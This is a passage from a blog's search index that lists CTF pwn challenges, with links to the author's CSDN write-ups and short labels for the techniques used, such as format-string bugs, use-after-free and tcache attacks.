id="xman-2019-format">xman_2019_format</h3><p>（非栈上格式化字符串仅一次利用的爆破）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121237020?spm=1001.2014.3001.5502">xman_2019_format（非栈上格式化字符串仅一次利用的爆破）_Nqoinaen的博客-CSDN博客_xman_2019_format</a></p><h3 id="ciscn-2019-final-5">ciscn_2019_final_5</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121275841?spm=1001.2014.3001.5502">ciscn_2019_final_5(临界条件错误，劫持GOT)_Nqoinaen的博客-CSDN博客</a></p><h3 id="qctf2018-stack2">qctf2018_stack2</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121292902?spm=1001.2014.3001.5502">qctf2018_stack2（数组越界，偏移寻找）_Nqoinaen的博客-CSDN博客_qctf2018_stack2</a></p><h3 id="ciscn-2019-sw-1">ciscn_2019_sw_1</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121302556?spm=1001.2014.3001.5502">ciscn_2019_sw_1（fmt劫持fini_array为main，获得一次循环）_Nqoinaen的博客-CSDN博客</a></p><h3 id="gyctf-2020-some-thing-interesting">gyctf_2020_some_thing_interesting</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121306153?spm=1001.2014.3001.5502">gyctf_2020_some_thing_interesting（fmt泄露libc，doublefree）_Nqoinaen的博客-CSDN博客</a></p><h3 id="gyctf-2020-document">gyctf_2020_document</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121321652?spm=1001.2014.3001.5502">gyctf_2020_document(uaf)_Nqoinaen的博客-CSDN博客_gyctf_2020_document</a></p><h3 id="houseoforange-hitcon-2016">houseoforange_hitcon_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121344075?spm=1001.2014.3001.5502">houseoforange_hitcon_2016（unsortbin attack，fsop）_Nqoinaen的博客-CSDN博客_unsortbinattack</a></p><h3 id="ciscn-2019-s-6">ciscn_2019_s_6</h3><p>（uaf）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121353453?spm=1001.2014.3001.5502">ciscn_2019_s_6（uaf）_Nqoinaen的博客-CSDN博客</a></p><h3 id="hgame2018-flag-server">hgame2018_flag_server</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121361533?spm=1001.2014.3001.5502">hgame2018_flag_server_Nqoinaen的博客-CSDN博客</a></p><h3 id="de1ctf-2019-weapon">de1ctf_2019_weapon</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121361905?spm=1001.2014.3001.5502">de1ctf_2019_weapon（IO_leak,doublefree）_Nqoinaen的博客-CSDN博客</a></p><h3 id="SWPUCTF-2019-p1KkHeap">SWPUCTF_2019_p1KkHeap</h3><p>（tcache表头攻击，uaf，ORW）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121398983?spm=1001.2014.3001.5502">SWPUCTF_2019_p1KkHeap（tcache表头攻击，uaf，ORW）_Nqoinaen的博客-CSDN博客_tcache 列表头</a></p><h3 id="sctf-2019-easy-heap">sctf_2019_easy_heap</h3><p>（off by null，unlink造成doublefree）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121411787?spm=1001.2014.3001.5502">sctf_2019_easy_heap（off by null，unlink造成doublefree）_Nqoinaen的博客-CSDN博客_unlink doublefree</a></p><h3 id="picoctf-2018-echooo">picoctf_2018_echooo</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121420155?spm=1001.2014.3001.5502">picoctf_2018_echooo（fmt）_Nqoinaen的博客-CSDN博客</a></p><h3 id="x-nuca-2018-offbyone2">x_nuca_2018_offbyone2</h3><p>（off by null，unlink造成doublefree）</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121429481?spm=1001.2014.3001.5502">x_nuca_2018_offbyone2（off by null，unlink造成doublefree）_Nqoinaen的博客-CSDN博客_x_nuca_2018_offbyone2</a></p><h2 id="大二下">大二下</h2><h2 id="大三上">大三上</h2><h3 id="shanghai2018-baby-arm，jarvisoj-typo（armrop）">shanghai2018_baby_arm，jarvisoj_typo（armrop）</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/126954854?spm=1001.2014.3001.5502">shanghai2018_baby_arm，jarvisoj_typo（armrop）_Nqoinaen的博客-CSDN博客</a></p><h3 id="qctf-2018-dice-game，xm-2019-awd-pwn2">qctf_2018_dice_game，xm_2019_awd_pwn2</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/126955874?spm=1001.2014.3001.5502">qctf_2018_dice_game，xm_2019_awd_pwn2_Nqoinaen的博客-CSDN博客</a></p><h3 id="2020-新春红包题-3">[2020 新春红包题]3</h3><p>(libc2.29 tcache tashing unlink )</p><p>[<a href="https://blog.csdn.net/m0_51251108/article/details/127078196?spm=1001.2014.3001.5502">2020 新春红包题]3(libc2.29 tcache tashing unlink )_Nqoinaen的博客-CSDN博客</a></p><h3 id="hitcon-ctf-2019-one-punch">hitcon_ctf_2019_one_punch</h3><p>(libc2.29 tcache tashing unlink)</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127121786?spm=1001.2014.3001.5502">hitcon_ctf_2019_one_punch(libc2.29 tcache tashing unlink)_Nqoinaen的博客-CSDN博客</a></p><h3 id="OGeek2019-Final-OVM">[OGeek2019 Final]OVM</h3><p>（简易虚拟机逃逸）</p><p>[<a href="https://blog.csdn.net/m0_51251108/article/details/127354652?spm=1001.2014.3001.5502">OGeek2019 Final]OVM（简易虚拟机逃逸）_Nqoinaen的博客-CSDN博客_ovm虚拟机</a></p><h2 id="止于此">止于此</h2>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
